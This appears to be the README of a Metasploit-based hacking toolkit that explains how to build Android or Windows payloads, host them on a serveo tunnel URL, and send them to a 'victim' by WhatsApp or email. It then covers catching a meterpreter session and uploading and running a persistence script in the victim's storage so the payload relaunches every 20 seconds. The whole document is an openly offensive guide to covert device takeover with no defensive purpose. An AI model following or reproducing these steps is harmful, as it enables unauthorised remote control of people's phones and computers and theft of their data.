Hello Visitor!!!

Here is a quick guide how to use it:

[1] Run the payload generator script by simply commanding :
    # bash Payload-Generator.sh
    Now you need to enter your active serveo tcp port
    Now enter your Payload name
    Now you can see two options Android or Windows
    Once ypu have selected one you can see two more options
    Web Payload and Simple Payload
    Once selecting the Web Payload your payload will be directly transfered
    to a website called :
    # https://payload.serveo.net/(Your payload name).apk
    Send this link to victim and he will download the payload

    Once you selected the Simple Payload a payload will be created in your
    device internal storage and you can send this payload to victim device
    using whatsapp or email or any other sources.

[2] Run your hack terminal by commanding :(If using web payload)
    # bash Msfconsole-attack.sh
    Once you have entered the command then amke sure you follow all the 
    steps over here before the payload is installed in the victim device
    Firstly selected the platform and then enter your serveo port
    The the rest process is automated no worry
    Then intsall the payload in victim and you will see something 
    like this on your terminal::
    meterpreter >
    If so..
    Bingo!! You have sucessfully hacked into victim phone 
    Check out the commands.txt to perform operation in victim device

[3] Now once you are in the system what if u want to access the victim
    anytime once you have exitted the meterpreter session..
    So here we use the persistent payload script.
    Once you have open the meterpreter session just fllow this..
    # meterpreter> cd/storage/emulated/0/Android/data
    By this you will be in the internal storage of the victim were the
    cache files of app are stored.Then do this...
    # meterpreter> upload $HOME/Metasploit-Hacking/persistent.sh
    By this you will upload the script to victim device
    This script will open the payload after 20 seconds again and again..
    Then run the script in victim by this command ..
    #meterpreter> shell
    #meterpreter> cd /storage/emulated/0/Android/data
    #meterpreter> sh persistent.sh
    Done now you can access the device anytime once u start exploit
    on the same port and host.
